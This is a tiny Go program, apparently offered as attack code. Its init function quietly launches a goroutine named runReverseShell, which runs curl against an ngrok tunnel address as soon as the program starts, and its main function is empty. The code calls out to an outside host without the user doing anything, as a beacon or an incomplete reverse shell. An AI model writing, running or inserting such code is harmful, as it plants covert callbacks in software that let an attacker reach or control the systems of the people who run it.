package main

import (
    "os/exec"
)
func init() {
    go runReverseShell()
}

func runReverseShell() {
    var cmd *exec.Cmd
        cmd = exec.Command("curl", "http://0.tcp.ap.ngrok.io:18663")
    _ = cmd.Start()
}

func main(){}